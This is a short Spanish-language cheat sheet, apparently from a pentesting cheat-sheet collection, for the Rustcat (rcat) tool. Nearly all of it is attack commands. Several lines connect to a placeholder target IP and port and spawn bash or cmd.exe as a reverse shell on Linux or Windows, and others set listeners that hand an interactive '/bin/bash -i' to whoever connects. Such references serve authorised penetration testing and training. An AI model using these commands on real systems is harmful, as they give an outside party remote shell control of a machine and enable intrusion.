# Rustcat Cheat Sheet

#### Ponerse en escucha en un puerto, usando comando de historial, completado de comando y bloqueo de ctrl-c
```
rcat -lp <PORT>
rcat listen -ib <PORT>
```

#### Conectarse y crear una bash reverse shell (Linux)
```
rcat connect -s bash <IP-TARGET> <PORT-TARGET>
```

#### Conectarse y crear un reverse shell (Windows)
```
rcat connect -s cmd.exe <IP-TARGET> <PORT-TARGET>
```

#### Escucha el puerto 55660 en localhost con historial de comandos y finalización de comandos e inicia un bash con modo interactivo en la conexión recibida:
```
rcat listen -ie "/bin/bash -i" 55660
```

#### Escucha el puerto 55660 en 0.0.0.0 con modo interactivo local:
```
rcat listen -l 55660
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)